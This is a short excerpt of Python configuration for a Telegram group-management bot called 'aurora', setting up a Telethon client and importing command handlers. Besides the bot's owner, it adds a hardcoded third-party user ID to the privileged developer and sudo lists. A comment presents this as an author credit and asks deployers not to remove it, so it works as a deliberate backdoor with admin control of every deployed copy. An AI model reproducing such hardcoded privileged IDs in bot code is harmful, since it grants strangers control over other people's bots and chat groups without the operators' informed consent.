...
# Don't Remove my ID from DEV and SUDO list..It Took many months to set up a bot like this..I have added many features in this bot ..by  @CoNqUeRoR_mEsKeTteR   
DEV_USERS.add(OWNER_ID)
DEV_USERS.add(1491765026)
SUDO_USERS.add(OWNER_ID)
SUDO_USERS.add(1491765026)

# Telethon
api_id = TELETHON_ID
api_hash = TELETHON_HASH
client = TelegramClient("aurora", api_id, api_hash)
...
from aurora.modules.helper_funcs.handlers import CustomCommandHandler, CustomRegexHandler, CustomMessageHandler
